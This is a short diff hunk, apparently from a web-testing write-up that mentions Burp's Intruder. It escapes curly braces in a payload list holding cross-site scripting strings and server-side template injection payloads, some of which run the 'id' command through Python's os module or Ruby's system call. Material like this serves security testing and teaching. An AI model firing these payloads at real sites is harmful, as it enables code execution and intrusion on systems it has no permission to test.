@@ -216,11 +216,11 @@ I didn't receive anything on my mail either. Let's send the request to Burp's In
 "><iframe src="javascript:alert('XSS');"></iframe>
 '><svg onload=alert('XSS')>
 "><svg onload=alert('XSS')>
-{{7*7}}
-{{config.items()}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-{{_self.env.global}}
-{{_self.env.global['app'].request.server['SERVER_SOFTWARE']}}
+\{\{7*7\}\}
+\{\{config.items()\}\}
+\{\{request.application.__globals__.__builtins__.__import__('os').popen('id').read()\}\}
+\{\{_self.env.global\}\}
+\{\{_self.env.global['app'].request.server['SERVER_SOFTWARE']\}\}
 <%= 7*7 %>
 <%= system('id') %>
 <%= `id` %>
